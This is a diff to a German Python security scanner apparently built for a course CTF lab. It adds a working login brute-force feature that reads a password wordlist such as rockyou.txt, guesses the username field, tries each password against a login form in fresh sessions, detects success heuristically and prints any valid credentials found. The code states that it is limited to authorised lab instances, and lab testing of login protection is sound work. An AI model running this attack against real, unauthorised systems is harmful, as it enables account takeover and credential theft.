@@ -8,6 +8,8 @@ Cowboy-Forums mehr, sondern funktioniert gegen beliebige (eigene) Seiten.
     pip install -r requirements.txt
     python attack_all.py --base http://127.0.0.1:5000
     python attack_all.py --base http://192.168.1.42:5000 --cookie "session=..."
+    python attack_all.py --base http://127.0.0.1:5000 \
+        --passwords rockyou.txt --username admin   # Login-Brute-Force mit Wortliste
 
 GRENZE: Nur gegen die eigene Instanz oder — im Übungs-CTF unter Einverständnis —
 gegen Instanzen im Kurs-Netz. Keine fremden/öffentlichen Systeme. Der Scan sendet
@@ -207,9 +209,11 @@ class _PageParser(HTMLParser):
 # ============================================================ Scanner
 class Scanner:
     def __init__(self, base, session=None, timeout=8, max_pages=25, max_targets=40,
-                 forge_user="admin"):
+                 forge_user="admin", passwords=None, username="admin"):
         self.base = base.rstrip("/")
         self.forge_user = forge_user  # Ziel-Identitaet fuer den Session-Forgery-Check
+        self.passwords = list(passwords) if passwords else None  # optionale Wortliste
+        self.username = username        # Benutzer fuer den Passwort-Listen-Angriff
         self.origin = urlsplit(self.base)
         self.sess = session or requests.Session()
         self.anon_sess = None   # cookie-lose Session fuer den Access-Control-Check
@@ -693,6 +697,16 @@ class Scanner:
             return [_finding("Brute-Force-Schutz", NA, "kein Login-Formular (Passwort-Feld) gefunden")]
         action, form, baseline = self.login_forms[0]
         pw_field = next(i["name"] for i in form["inputs"] if i["type"] == "password")
+        user_field = self._username_field(form)
+        out = []
+        # (A) Optionaler Passwort-Listen-Angriff -- nur wenn --passwords gesetzt ist.
+        if self.passwords:
+            out.extend(self._brute_force_passwords(action, baseline, user_field, pw_field))
+            # Hat ein Lockout den Listen-Angriff gestoppt, ist der Schutz belegt:
+            # die 12-Fehl-Login-Probe unten wuerde nur erneut gegen die Sperre laufen.
+            if any("Lockout/Rate-Limit" in f.detail for f in out):
+                return out
+        # (B) Schutz-Bewertung: 12 Fehl-Logins -> greift ein Lockout/Rate-Limit?
         blocked = False
         for _ in range(12):
             data = dict(baseline)
@@ -708,9 +722,94 @@ class Scanner:
                 blocked = True
                 break
         if blocked:
-            return [_finding("Brute-Force-Schutz", SAFE, "Rate-Limit/Lockout aktiv", where=action)]
-        return [_finding("Brute-Force-Schutz", VULN,
-                         "12 Fehl-Logins ohne Bremse (kein Lockout/Rate-Limit)", MED, action)]
+            out.append(_finding("Brute-Force-Schutz", SAFE, "Rate-Limit/Lockout aktiv", where=action))
+        else:
+            out.append(_finding("Brute-Force-Schutz", VULN,
+                                "12 Fehl-Logins ohne Bremse (kein Lockout/Rate-Limit)", MED, action))
+        return out
+
+    def _username_field(self, form):
+        """Rät das Benutzer-/Login-Feld eines Login-Formulars (alles außer Passwort)."""
+        pw = {i["name"] for i in form["inputs"] if i["type"] == "password"}
+        cands = [i for i in form["inputs"]
+                 if i["name"] not in pw
+                 and i["type"] not in ("submit", "button", "hidden", "file", "checkbox", "radio")
+                 and not CSRF_FIELD.search(i["name"])]
+        for i in cands:
+            if re.search(r"(user|login|benutzer|name|e?mail|konto|account)", i["name"], re.I):
+                return i["name"]
+        return cands[0]["name"] if cands else None
+
+    def _brute_force_passwords(self, action, baseline, user_field, pw_field):
+        """Probiert die mitgegebene Passwort-Liste gegen EINEN Benutzer am Login-Formular.
+
+        Meldet gefundene gültige Zugangsdaten (VULN) und stoppt, sobald die App
+        blockt (Lockout/Rate-Limit -> SAFE). Jeder Versuch nutzt eine frische
+        Session, damit der Scanner-Zustand nicht verfälscht wird und IP-basierte
+        Sperren trotzdem greifen. GRENZE: nur gegen autorisierte Lab-Instanzen.
+        """
+        user = self.username or "admin"
+        ref = self._login_attempt(action, baseline, user_field, pw_field, user, _tag(14))
+        if ref is None:
+            return [_finding("Brute-Force (Passwort-Liste)", NA,
+                             "Login-Request fehlgeschlagen (Netzwerk)", where=action)]
+        tried = 0
+        for pw in self.passwords:
+            res = self._login_attempt(action, baseline, user_field, pw_field, user, pw)
+            if res is None:
+                continue
+            tried += 1
+            if res["blocked"]:
+                return [_finding("Brute-Force (Passwort-Liste)", SAFE,
+                                 f"App blockt nach {tried} Versuch(en) "
+                                 f"(Lockout/Rate-Limit) — Listen-Angriff gestoppt", where=action)]
+            if self._login_succeeded(res, ref):
+                return [_finding("Brute-Force (Passwort-Liste)", VULN,
+                                 f"gültige Zugangsdaten gefunden: "
+                                 f"{user_field or 'user'}={user!r}, {pw_field}={pw!r} "
+                                 f"(nach {tried} Versuch(en))", CRIT, action)]
+        return [_finding("Brute-Force (Passwort-Liste)", SAFE,
+                         f"{tried} Passwörter aus Liste probiert, kein Treffer für {user!r}",
+                         where=action)]
+
+    def _login_attempt(self, action, baseline, user_field, pw_field, user, pw):
+        """Ein Login-Versuch mit frischer Session; gibt ein Ergebnis-Dict oder None zurück."""
+        data = dict(baseline)
+        if user_field:
+            data[user_field] = user
+        data[pw_field] = pw
+        try:
+            sess = self.session_factory()
+            r = sess.post(action, data=data, timeout=self.timeout, allow_redirects=True)
+        except RequestException:
+            return None
+        body = r.text or ""
+        low = body.lower()
+        blocked = r.status_code == 429 or any(
+            w in low for w in ("gesperrt", "locked", "too many", "zu viele",
+                               "rate limit", "captcha", "blockiert"))
+        return {"status": r.status_code, "low": low, "length": len(body),
+                "final": urlsplit(r.url).path.rstrip("/"), "blocked": blocked,
+                "has_pw_field": 'type="password"' in low,
+                "logout": bool(LOGOUT_SIG.search(body))}
+
+    @staticmethod
+    def _login_succeeded(res, ref):
+        """Heuristik: unterscheidet einen erfolgreichen Login vom Fehl-Login `ref`."""
+        if res["blocked"] or res["has_pw_field"]:
+            return False
+        # Klarer Erfolg: eingeloggte Ansicht mit Logout-Affordanz, kein Login-Formular mehr.
+        if res["logout"]:
+            return True
+        # Weg vom Login navigiert (anderer Pfad als beim Fehl-Login, nicht /login).
+        if res["final"] != ref["final"] and "login" not in res["final"].lower():
+            return True
+        # Deutlich andere Antwortlänge als beim Fehlversuch und keine Fehlermeldung.
+        err = any(w in res["low"] for w in
+                  ("invalid", "falsch", "incorrect", "wrong", "ungueltig", "ungültig",
+                   "fehlgeschlagen", "failed", "denied", "not found"))
+        return (not err
+                and abs(res["length"] - ref["length"]) > max(80, ref["length"] * 0.2))
 
     def check_session_cookie(self):
         out = []
@@ -875,6 +974,9 @@ def run(base, **kw):
     sc.crawl()
     print(f"[i] gecrawlt: {len(sc.pages)} Seite(n), {len(sc.targets)} Eingabepunkt(e), "
           f"{len(sc.login_forms)} Login-Formular(e)")
+    if sc.passwords:
+        print(f"[i] Passwort-Liste: {len(sc.passwords)} Eintrag/Einträge gegen "
+              f"Benutzer {sc.username!r}")
     if sc.skipped_signup:
         print(f"[i] {sc.skipped_signup} Registrier-Formular(e) NICHT aktiv befüllt "
               f"(legt sonst Müll-Accounts an)")
@@ -909,7 +1011,24 @@ def main():
     ap.add_argument("--cookie", default="", help="Session-Cookie fuer authentifizierten Scan, 'name=wert'")
     ap.add_argument("--forge-user", default="admin",
                     help="Ziel-Identitaet fuer den Session-Forgery-Check (Default: admin)")
+    ap.add_argument("--passwords", default="",
+                    help="Datei mit Passwoertern (eine pro Zeile) fuer einen Login-Brute-Force "
+                         "gegen das gefundene Login-Formular. Nur gegen autorisierte Instanzen.")
+    ap.add_argument("--username", default="admin",
+                    help="Benutzername fuer den Passwort-Listen-Angriff (Default: admin)")
     args = ap.parse_args()
+
+    passwords = None
+    if args.passwords:
+        try:
+            with open(args.passwords, encoding="utf-8", errors="replace") as fh:
+                passwords = [ln.rstrip("\r\n") for ln in fh if ln.strip()]
+        except OSError as e:
+            print(f"[!] Passwort-Liste nicht lesbar: {e}", file=sys.stderr)
+            return 2
+        if not passwords:
+            print(f"[!] Passwort-Liste '{args.passwords}' ist leer.", file=sys.stderr)
+            return 2
 
     sess = requests.Session()
     if args.cookie and "=" in args.cookie:
@@ -917,7 +1036,7 @@ def main():
         sess.cookies.set(name.strip(), val.strip())
     run(args.base, session=sess, timeout=args.timeout,
         max_pages=args.max_pages, max_targets=args.max_targets,
-        forge_user=args.forge_user)
+        forge_user=args.forge_user, passwords=passwords, username=args.username)
     return 0
 
 
